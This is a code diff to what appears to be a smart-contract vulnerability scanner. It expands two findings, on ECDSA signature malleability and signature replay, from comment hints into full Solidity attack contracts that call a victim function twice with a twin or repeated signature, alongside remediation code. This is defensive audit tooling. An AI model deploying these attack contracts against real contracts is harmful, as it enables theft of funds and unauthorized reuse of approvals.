@@ -2550,7 +2550,16 @@ function scanSimple(
         detector: "signature-malleability",
         summary: "ecrecover accepts both s and secp256k1n - s for many signatures. Without an s < n/2 check, one approval can be replayed as a second distinct signature.",
         walkthrough: "1. A signature (v, r, s) has a malleable twin (v', r, n - s).\n2. Both recover the same signer on many libraries, but the bytes differ.\n3. A mapping keyed by the signature hash, rather than by a nonce, treats them as two uses.",
-        exploitSolidity: `// n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n// s2 = n - s; flip v between 27 and 28. ecrecover returns the same signer.`,
+        exploitSolidity: `interface IVictim { function ${fn.name}(bytes32 hash, uint8 v, bytes32 r, bytes32 s) external; }
+contract MalleabilityAttack {
+    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
+    function attack(address victim, bytes32 hash, uint8 v, bytes32 r, bytes32 s) external {
+        IVictim(victim).${fn.name}(hash, v, r, s);
+        uint8 v2 = v == 27 ? 28 : 27;
+        bytes32 s2 = bytes32(N - uint256(s));
+        IVictim(victim).${fn.name}(hash, v2, r, s2);
+    }
+}`,
         remediationSolidity: `require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "s");\nrequire(v == 27 || v == 28, "v");`,
         locationFn: fn.name,
         locationLine: fn.line,
@@ -2566,7 +2575,14 @@ function scanSimple(
         detector: "signature-replay",
         summary: "The digest does not appear to include a nonce, a deadline, or a domain separator. The same signature can be reused, possibly on another chain.",
         walkthrough: "1. ecrecover only tells you who signed the hash.\n2. If the hash is just the arguments, the signer cannot prevent a second submission.\n3. Include chainid, the verifying-contract address, a nonce that increments, and a deadline.",
-        exploitSolidity: `// Submit the same (user, amount, v, r, s) again after the first claim pays.`,
+        exploitSolidity: `interface IVictim { function ${fn.name}(bytes32 hash, uint8 v, bytes32 r, bytes32 s) external; }
+contract ReplayAttack {
+    function attack(address victim, bytes32 hash, uint8 v, bytes32 r, bytes32 s) external {
+        IVictim(victim).${fn.name}(hash, v, r, s);
+        // Replay identical signature
+        IVictim(victim).${fn.name}(hash, v, r, s);
+    }
+}`,
         remediationSolidity: `bytes32 digest = keccak256(abi.encodePacked(\n    "\\x19\\x01", DOMAIN_SEPARATOR(), keccak256(abi.encode(TYPEHASH, user, amount, nonces[user]++, deadline))\n));\nrequire(block.timestamp <= deadline, "expired");`,
         locationFn: fn.name,
         locationLine: fn.line,
